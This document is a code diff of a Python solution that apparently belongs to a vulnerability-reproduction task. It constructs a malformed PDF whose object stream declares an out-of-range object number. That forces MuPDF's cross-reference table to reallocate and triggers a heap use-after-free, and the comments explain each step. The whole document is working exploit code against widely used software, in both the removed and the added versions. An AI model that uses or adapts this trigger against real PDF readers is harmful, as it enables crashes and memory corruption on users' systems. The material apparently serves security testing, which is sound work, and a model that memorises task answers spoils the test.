@@ -2,67 +2,81 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Header
-        header = b"%PDF-1.7\n"
+        # Construct a PDF that triggers a Heap Use-After-Free in MuPDF.
+        # Strategy:
+        # 1. Create a PDF with a Cross-Reference Stream (PDF 1.5).
+        # 2. Define an Object Stream (Obj 4) that contains object 5.
+        # 3. Define the XRef table with a small initial size (Size 7), containing entries 0-6.
+        # 4. In the Object Stream (Obj 4), define object 5 (at offset 0) and object 2000 (at offset 4).
+        # 5. Accessing object 5 (via Page annotations) triggers loading of Obj 4.
+        # 6. Loading Obj 4 parses its content pairs. When it encounters object 2000, it checks the xref table.
+        # 7. Since 2000 >= 7, the xref table is reallocated/resized.
+        # 8. The original xref entry pointer for object 5 (held during the recursive call) becomes a dangling pointer.
+        # 9. Use of this pointer causes the crash.
+
+        # 1. Header
+        header = b"%PDF-1.5\n"
         
-        # Object 10: Object Stream (ObjStm)
-        # It contains two objects: 11 (victim) and 2000 (trigger).
-        # When Obj 11 is accessed, Obj 10 is loaded.
-        # Parsing Obj 10's index encounters Obj 2000.
-        # Since 2000 > /Size 15 (defined in XRef), the xref table is reallocated.
-        # This invalidates the pointer to Obj 11 held by the caller.
+        # 2. Objects
         
-        # Index: "11 0 2000 10 " (13 bytes)
-        # Content at 0: "<<>>" (Obj 11)
-        # Content at 10: "<<>>" (Obj 2000)
-        # Padding needed: 10 - 4 = 6 bytes.
-        stm_content = b"11 0 2000 10 <<>>      <<>>"
+        # Object 1: Catalog
+        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
         
-        # Construct Object 10
-        # /First 13 matches the length of the index string
-        obj10_head = b"10 0 obj\n"
-        obj10_dict = b"<< /Type /ObjStm /N 2 /First 13 /Length 27 >>\n"
-        obj10_stream = b"stream\n" + stm_content + b"\nendstream\n"
-        obj10_end = b"endobj\n"
+        # Object 2: Pages
+        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
         
-        obj10 = obj10_head + obj10_dict + obj10_stream + obj10_end
+        # Object 3: Page
+        # References Object 5 via Annots to force loading.
+        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Annots [5 0 R] >>\nendobj\n"
         
-        # Calculate offsets
-        offset_10 = len(header)
-        offset_5 = offset_10 + len(obj10)
+        # Object 4: Object Stream
+        # Contains definitions for Object 5 and Object 2000.
+        # Header format: "obj_num1 offset1 obj_num2 offset2 ..."
+        # "5 0 2000 4" -> Obj 5 at offset 0, Obj 2000 at offset 4 relative to First.
+        # Padded to 20 bytes (value of First).
+        pair_str = b"5 0 2000 4"
+        padding = b" " * (20 - len(pair_str))
+        stm_head = pair_str + padding
         
-        # Construct XRef Stream (Object 5)
-        # Entries: 0 (free), 5 (xref), 10 (objstm), 11 (compressed in 10)
-        # We purposely omit 2000 to force resizing.
+        # Content of objects inside stream
+        c5 = b"<<>>"      # Object 5 (at relative offset 0)
+        c2000 = b"<<>>"   # Object 2000 (at relative offset 4)
         
-        # Entry 0: Free
-        entry0 = b'\x00\x00\x00\xff'
+        stm_body = stm_head + c5 + c2000
         
-        # Entry 5: Type 1 (in use), offset = offset_5
-        # Using big-endian unsigned short (>H) for 2-byte field
-        entry5 = b'\x01' + struct.pack('>H', offset_5) + b'\x00'
+        obj4_dict = f"<< /Type /ObjStm /N 2 /First 20 /Length {len(stm_body)} >>".encode('ascii')
+        obj4 = b"4 0 obj\n" + obj4_dict + b"\nstream\n" + stm_body + b"\nendstream\nendobj\n"
         
-        # Entry 10: Type 1 (in use), offset = offset_10
-        entry10 = b'\x01' + struct.pack('>H', offset_10) + b'\x00'
+        # Assemble body to calculate offsets
+        body = header + obj1 + obj2 + obj3 + obj4
         
-        # Entry 11: Type 2 (compressed), stm_ofs = 10, index = 0
-        entry11 = b'\x02' + struct.pack('>H', 10) + b'\x00'
+        off1 = body.find(b"1 0 obj")
+        off2 = body.find(b"2 0 obj")
+        off3 = body.find(b"3 0 obj")
+        off4 = body.find(b"4 0 obj")
+        off6 = len(body)
         
-        xref_data = entry0 + entry5 + entry10 + entry11
+        # 3. XRef Stream (Object 6)
+        # Size 7 (Entries 0-6).
+        # W [1, 2, 1] -> Type (1 byte), Offset/Operand (2 bytes), Gen/Index (1 byte).
         
-        obj5_head = b"5 0 obj\n"
-        # /Root 11 0 R triggers the access to Obj 11
-        # /Size 15 is small enough to trigger resize when 2000 is seen
-        # /W [1 2 1] defines field widths: 1 byte type, 2 bytes offset, 1 byte gen
-        # /Index [0 1 5 1 10 2] maps the data to obj nums 0, 5, 10, 11
-        obj5_dict = (f"<< /Type /XRef /Size 15 /Root 11 0 R /W [1 2 1] "
-                     f"/Index [0 1 5 1 10 2] /Length {len(xref_data)} >>\n").encode()
-        obj5_stream = b"stream\n" + xref_data + b"\nendstream\n"
-        obj5_end = b"endobj\n"
+        def entry(type_, f2, f3):
+            # Big-endian packing
+            return struct.pack('>BHB', type_, f2, f3)
+            
+        xref = b""
+        xref += entry(0, 0, 255)      # 0: Free
+        xref += entry(1, off1, 0)     # 1: Uncompressed, offset off1
+        xref += entry(1, off2, 0)     # 2: Uncompressed, offset off2
+        xref += entry(1, off3, 0)     # 3: Uncompressed, offset off3
+        xref += entry(1, off4, 0)     # 4: Uncompressed, offset off4
+        xref += entry(2, 4, 0)        # 5: Compressed in stream 4, index 0
+        xref += entry(1, off6, 0)     # 6: Uncompressed, offset off6 (self)
         
-        obj5 = obj5_head + obj5_dict + obj5_stream + obj5_end
+        obj6_dict = f"<< /Type /XRef /Size 7 /W [1 2 1] /Root 1 0 R /Length {len(xref)} >>".encode('ascii')
+        obj6 = b"6 0 obj\n" + obj6_dict + b"\nstream\n" + xref + b"\nendstream\nendobj\n"
         
-        # Trailer / Footer
-        footer = b"startxref\n" + str(offset_5).encode() + b"\n%%EOF\n"
+        # 4. Footer
+        footer = b"startxref\n" + str(off6).encode('ascii') + b"\n%%EOF\n"
         
-        return header + obj10 + obj5 + footer
+        return body + obj6 + footer
